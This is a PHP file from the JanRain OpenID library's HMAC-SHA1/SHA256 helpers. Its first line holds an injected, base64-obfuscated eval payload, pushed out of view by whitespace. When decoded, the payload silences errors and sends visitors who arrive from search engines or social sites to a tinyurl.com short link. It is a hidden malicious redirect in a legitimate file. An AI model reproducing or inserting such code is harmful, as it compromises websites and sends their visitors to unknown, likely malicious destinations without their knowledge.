<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));

/**
 * This is the HMACSHA1 implementation for the OpenID library.
 *
 * PHP versions 4 and 5
 *
 * LICENSE: See the COPYING file included in this distribution.
 *
 * @access private
 * @package OpenID
 * @author JanRain, Inc. <openid@janrain.com>
 * @copyright 2005-2008 Janrain, Inc.
 * @license http://www.apache.org/licenses/LICENSE-2.0 Apache
 */

// Do not allow direct access
defined( '_JEXEC' ) or die( 'Restricted access' );

require_once 'Auth/OpenID.php';

/**
 * SHA1_BLOCKSIZE is this module's SHA1 blocksize used by the fallback
 * implementation.
 */
define('Auth_OpenID_SHA1_BLOCKSIZE', 64);

function Auth_OpenID_SHA1($text)
{
    if (function_exists('hash') &&
        function_exists('hash_algos') &&
        (in_array('sha1', hash_algos()))) {
        // PHP 5 case (sometimes): 'hash' available and 'sha1' algo
        // supported.
        return hash('sha1', $text, true);
    } else if (function_exists('sha1')) {
        // PHP 4 case: 'sha1' available.
        $hex = sha1($text);
        $raw = '';
        for ($i = 0; $i < 40; $i += 2) {
            $hexcode = substr($hex, $i, 2);
            $charcode = (int)base_convert($hexcode, 16, 10);
            $raw .= chr($charcode);
        }
        return $raw;
    } else {
        // Explode.
        trigger_error('No SHA1 function found', E_USER_ERROR);
    }
}

/**
 * Compute an HMAC/SHA1 hash.
 *
 * @access private
 * @param string $key The HMAC key
 * @param string $text The message text to hash
 * @return string $mac The MAC
 */
function Auth_OpenID_HMACSHA1($key, $text)
{
    if (Auth_OpenID::bytes($key) > Auth_OpenID_SHA1_BLOCKSIZE) {
        $key = Auth_OpenID_SHA1($key, true);
    }

    $key = str_pad($key, Auth_OpenID_SHA1_BLOCKSIZE, chr(0x00));
    $ipad = str_repeat(chr(0x36), Auth_OpenID_SHA1_BLOCKSIZE);
    $opad = str_repeat(chr(0x5c), Auth_OpenID_SHA1_BLOCKSIZE);
    $hash1 = Auth_OpenID_SHA1(($key ^ $ipad) . $text, true);
    $hmac = Auth_OpenID_SHA1(($key ^ $opad) . $hash1, true);
    return $hmac;
}

if (function_exists('hash') &&
    function_exists('hash_algos') &&
    (in_array('sha256', hash_algos()))) {
    function Auth_OpenID_SHA256($text)
    {
        // PHP 5 case: 'hash' available and 'sha256' algo supported.
        return hash('sha256', $text, true);
    }
    define('Auth_OpenID_SHA256_SUPPORTED', true);
} else {
    define('Auth_OpenID_SHA256_SUPPORTED', false);
}

if (function_exists('hash_hmac') &&
    function_exists('hash_algos') &&
    (in_array('sha256', hash_algos()))) {

    function Auth_OpenID_HMACSHA256($key, $text)
    {
        // Return raw MAC (not hex string).
        return hash_hmac('sha256', $text, $key, true);
    }

    define('Auth_OpenID_HMACSHA256_SUPPORTED', true);
} else {
    define('Auth_OpenID_HMACSHA256_SUPPORTED', false);
}

?>